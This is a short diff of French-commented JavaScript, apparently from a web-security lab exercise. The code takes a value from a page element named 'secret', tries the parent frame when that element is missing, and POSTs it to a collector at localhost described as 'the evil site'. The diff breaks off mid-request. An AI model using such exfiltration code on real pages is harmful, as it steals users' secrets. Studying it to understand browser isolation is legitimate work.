@@ -1,6 +1,13 @@
-const secret = document.getElementById('secret').innerText;
+const secretElement = document.getElementById('secret');
+let secret;
 
-//envoie du secret vers le site evil
+if (secretElement) {
+    secret = secretElement.innerText; // Récupérer le secret si présent
+} else {
+    secret = window.parent.document.getElementById('secret').innerText; // Essayer d’accéder au parent
+}
+
+// Envoie du secret vers le site evil
 fetch("http://localhost:9999/collect.php", {
     method: "POST",
     headers: {
